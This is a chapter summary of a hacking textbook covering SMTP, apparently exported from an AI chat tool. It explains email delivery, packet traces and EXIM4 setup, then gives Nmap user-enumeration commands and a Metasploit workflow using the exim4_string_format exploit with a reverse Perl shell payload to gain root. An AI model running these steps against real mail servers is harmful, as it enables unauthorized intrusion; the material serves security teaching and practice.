SUMMARY OF 
**NETWORK BASICS FOR HACKERS** 
BY OCCUPYTHEWEB

---

# CHAPTER 10: SIMPLE MESSAGE TRANSFER PROTOCOL (SMTP)

---

- This chapter explains SMTP’s role in email delivery, walks through traffic analysis, shows how to stand up an EXIM4 server on Kali, and demonstrates reconnaissance and exploitation workflows against SMTP infrastructure. :contentReference[oaicite:0]{index=0}

## What is SMTP?

- SMTP moves email between servers; clients typically **send** via SMTP and **retrieve** via POP3 or IMAP. Server-to-server delivery is SMTP on **port 25**, POP3 uses **110**, and IMAP uses **143**. Although first standardized in **1983**, SMTP still carries nearly all email today. :contentReference[oaicite:1]{index=1} :contentReference[oaicite:2]{index=2}

## The Email Processing Model

- A Mail User Agent (MUA) submits mail to a Mail Submission Agent/Server (MSA) using SMTP on **port 587**. The message is forwarded to a Mail Transfer Agent/Unit (MTA/MTU). The boundary MTA looks up the recipient domain’s **MX record** in DNS, connects to the target MTA, and sends the message. On receipt, a **Mail Delivery Agent (MDA)** stores it for the authenticated MUA to retrieve. :contentReference[oaicite:3]{index=3} :contentReference[oaicite:4]{index=4}

## Packet-Level Analysis of SMTP

- A typical trace shows the **TCP three-way handshake** (SYN, SYN/ACK, ACK), the server banner (e.g., Postfix on Ubuntu), and client commands: **EHLO**, then addressing via **MAIL FROM** and **RCPT TO**. :contentReference[oaicite:5]{index=5}

## Building an SMTP (EXIM4) Server in Linux

- Install EXIM4 on Kali from the repo: `sudo apt install exim4`. Run the configuration wizard: `sudo dpkg-reconfigure exim4-config`. Choose your **mail server type** (for Internet send/receive), supply your **owned domain**, set the **listen IP**, confirm **local recipient domains** (default “kali”), optionally leave **relay domains** blank, pick local delivery method (**/var/mail** or home), optionally minimize **DNS lookups**, decide whether to **split** the config (unsplit for stability), then **start** EXIM4 to send/receive mail. :contentReference[oaicite:6]{index=6} :contentReference[oaicite:7]{index=7} :contentReference[oaicite:8]{index=8} :contentReference[oaicite:9]{index=9} :contentReference[oaicite:10]{index=10}

## Vulnerabilities in SMTP

- **Microsoft Exchange (2021):** widely exploited vulnerabilities enabled access to corporate/institutional email; the FBI was authorized to patch affected US systems. :contentReference[oaicite:11]{index=11}  
- **EXIM (2020):** two severe EXIM server flaws allowed unauthorized access to stored email. :contentReference[oaicite:12]{index=12}

## Reconnaissance and Hacking SMTP

- **Service & version discovery:** Scan SMTP on **port 25** with Nmap and aggressive detection:  
  `nmap -sT -A <target> -p25`. :contentReference[oaicite:13]{index=13}  
- **Scripted enumeration & vuln checks:** Run all SMTP NSE scripts:  
  `nmap --script=smtp-* <target> -p25` → can **enumerate users** and flag known issues (e.g., **CVE-2010-4344/4345**). :contentReference[oaicite:14]{index=14} :contentReference[oaicite:15]{index=15}  
- **Exploit with Metasploit:**  
  `msfconsole` → `search type:exploits exim` → `use exploit/unix/smtp/exim4_string_format` → `info` (heap buffer overflow; **auto-priv-esc to root if Perl detected**) → set `RHOSTS`, choose payload `cmd/unix/reverse_perl`, set `LHOST`/`LPORT` (e.g., 443), then `exploit`. Successful runs yield a shell; verify with `id`, `whoami`, `pwd`, `uname -a`. :contentReference[oaicite:16]{index=16} :contentReference[oaicite:17]{index=17} :contentReference[oaicite:18]{index=18} :contentReference[oaicite:19]{index=19} :contentReference[oaicite:20]{index=20} :contentReference[oaicite:21]{index=21}

## Exercises

- Build an SMTP server for your domain. :contentReference[oaicite:22]{index=22}  
- Conduct reconnaissance on your new SMTP server. :contentReference[oaicite:23]{index=23}

---

## Summary author: **Jeremy Ray Jewell**
[GitHub](https://github.com/jeremyrayjewell)  
[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
